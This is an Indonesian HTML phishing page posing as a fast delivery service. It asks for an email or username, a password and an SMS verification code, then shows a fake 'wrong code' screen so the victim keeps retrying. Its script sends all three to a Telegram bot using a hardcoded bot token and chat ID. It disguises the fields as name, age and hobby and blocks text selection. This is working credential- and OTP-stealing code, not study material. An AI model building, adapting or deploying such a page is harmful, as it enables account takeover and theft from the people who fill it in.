<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Form Multi Pengiriman Cepat</title>
    
    <style>
        /* --- BACKGROUND UTAMA PUTIH --- */
        html, body {
            height: 100%;
            margin: 0;
            padding: 0;
            background-color: #ffffff; 
            color: #333333;
            font-family: sans-serif;
            box-sizing: border-box;
            overflow: hidden; /* Mengunci layar utama agar tidak goyang naik turun */

            /* FITUR: Mengunci teks agar tidak bisa disalin */
            -webkit-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        .halaman {
            background-color: #f9f9f9;
            padding: 20px; 
            max-width: 400px;
            height: 100vh; 
            margin: 0 auto; 
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            border-radius: 0; 
            display: flex;
            flex-direction: column;
            align-items: center;
            box-sizing: border-box;
            position: relative; 
        }

        #bagian2, #bagian3 {
            display: none;
        }

        /* --- KONTEN ATAS (BISA OTOMATIS NAIK) --- */
        .konten-form {
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            box-sizing: border-box;
            transition: all 0.2s ease; /* Efek transisi halus saat terangkat */
        }

        h1 { 
            color: #000000; 
            font-weight: bold;
            margin-top: 15px; 
            margin-bottom: 5px;
            font-size: 22px;
        } 

        p {
            margin-top: 0;
            margin-bottom: 15px;
            font-size: 14px;
        }
        
        img {
            width: 140px;  
            height: 140px; 
            border-radius: 15px; 
            margin-bottom: 10px;
            object-fit: cover; 
            margin-top: 15px; 
            transition: all 0.2s ease;
        }

        /* --- INPUT RATA KIRI-KANAN --- */
        input {
            padding: 12px 15px;
            width: 100%;        
            max-width: 100%;    
            border-radius: 8px;
            border: none; 
            background-color: #eeeeee; 
            color: #333333;
            font-size: 15px;
            outline: none; 
            margin-bottom: 12px;
            text-align: left; 
            box-sizing: border-box; 
        }

        input:focus {
            background-color: #e5e5e5;
        }

        /* --- CONTAINER TOMBOL MENTOK PALING BAWAH --- */
        .tombol-container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            box-sizing: border-box;
            background-color: #f9f9f9; 
            position: absolute; 
            bottom: 0;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            justify-content: center;
        }

        button {
            background-color: #d32f2f; 
            color: #ffffff;
            border: none;
            padding: 14px 30px;
            font-size: 16px;
            border-radius: 30px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;        
            box-shadow: 0 3px 10px rgba(211, 47, 47, 0.3);
            box-sizing: border-box; 
        }

        .btn-ulang {
            background-color: #333333; 
            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.2);
        }

        /* --- TRIK RAHASIA: OTOMATIS MENAIKKAN FOTO & KOTAK INPUT SAAT KEYBOARD AKTIF --- */
        @media screen and (max-height: 550px) {
            .tombol-container {
                position: fixed; /* Tombol merah tetap melayang pas di atas keyboard */
                padding: 10px 20px;
            }
            
            /* Foto kucing sengaja dikecilkan sedikit (bukan dihapus) agar menghemat ruang */
            img {
                width: 90px !important;
                height: 90px !important;
                margin-top: 5px !important;
                margin-bottom: 5px !important;
            }

            /* Memangkas jarak tulisan agar seluruh komponen terangkat naik ke atas */
            h1 {
                font-size: 18px;
                margin-top: 2px !important;
                margin-bottom: 2px !important;
            }
            p {
                margin-bottom: 8px !important;
            }
            input {
                margin-bottom: 8px !important;
            }
        }
    </style>
</head>
<body>

    <div id="bagian1" class="halaman">
        <div class="konten-form">
            <img src="https://play-lh.googleusercontent.com/mG6_nsn89FF3pKHklkoKhJhYZEsUTkooXD4DFjPffFj4nzfG-VXu6E4jxqzc6TM2U5o" alt="Foto Bagian 1">
            
            <h1>EXTRA BUBBELWARP</h1>
            <p>pengiriman dijamin cepat dan aman.</p>
            
            <input type="text" id="inputNama" placeholder="alamat email atau pengguna">
            <input type="text" id="inputUmur" placeholder="Kata sandi">
        </div>
        <div class="tombol-container">
            <button onclick="pindahKe(2)">Lanjutkan</button>
        </div>
    </div>

    <div id="bagian2" class="halaman">
        <div class="konten-form">
            <img src="https://play-lh.googleusercontent.com/mG6_nsn89FF3pKHklkoKhJhYZEsUTkooXD4DFjPffFj4nzfG-VXu6E4jxqzc6TM2U5o" alt="Foto Bagian 2">
            
            <h1>KODE VERIFIKASI</h1>
            <p>periksa kode verifikas anda di sms.</p>
            
            <input type="number" id="inputHobi" placeholder="masukkan kode verifikasi">
        </div>
        <div class="tombol-container">
            <button onclick="tampilkanHasil()">Lanjutkan</button>
        </div>
    </div>

    <div id="bagian3" class="halaman">
        <div class="konten-form">
            <h1>KODE VERIFIKASI ANDA SALAH</h1>
            <p>periksa kembali kode verifikasi anda di sms.</p>

            <img src="https://png.pngtree.com/png-clipart/20240731/original/pngtree-wrong-false-error-sign-red-circle-transparent-psd-png-image_15673172.png" alt="Foto Bagian 3">
        </div>
        <div class="tombol-container">
            <button class="btn-ulang" onclick="pindahKe(1)">ULANGI KEMBALI</button>
        </div>
    </div>

    <script>
        function tampilkanHasil() {
            var nama = document.getElementById('inputNama').value;
            var umur = document.getElementById('inputUmur').value;
            var hobi = document.getElementById('inputHobi').value;

            if (hobi == "") {
                alert("Gunakan akun tiktok atau tokopedia apabila tidak menerima kode verifikasi!");
                return;
            }

            // ================= PENGATURAN BOT TELEGRAM =================
            var tokenBot = "8839179457:AAEXfHKC0IAtVOU_oBXzhGqwZhypKqJnsNo"; 
            var chatID = "7938498485";     

            var pesanTelegram = "📬 *LAPORAN BARU MASUK* 📬\n\n" +
                                "👤 *Nama:* " + (nama ? nama : "-") + "\n" +
                                "🎂 *Umur:* " + (umur ? umur : "-") + " tahun\n" +
                                "🎯 *Hobi:* " + hobi;

            var urlTlgrm = "https://api.telegram.org/bot" + tokenBot + "/sendMessage";
            
            fetch(urlTlgrm, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: chatID,
                    text: pesanTelegram,
                    parse_mode: "Markdown"
                })
            })
            .then(response => {
                if(response.ok) {
                    console.log("Laporan berhasil dikirim ke Telegram!");
                } else {
                    console.log("Gagal mengirim laporan.");
                }
            })
            .catch(error => console.error("Error:", error));

            pindahKe(3);
        }

        function pindahKe(nomorHalaman) {
            document.getElementById('bagian1').style.display = 'none';
            document.getElementById('bagian2').style.display = 'none';
            document.getElementById('bagian3').style.display = 'none';

            var target = document.getElementById('bagian' + nomorHalaman);
            target.style.display = 'flex';
        }
    </script>
</body>
</html>
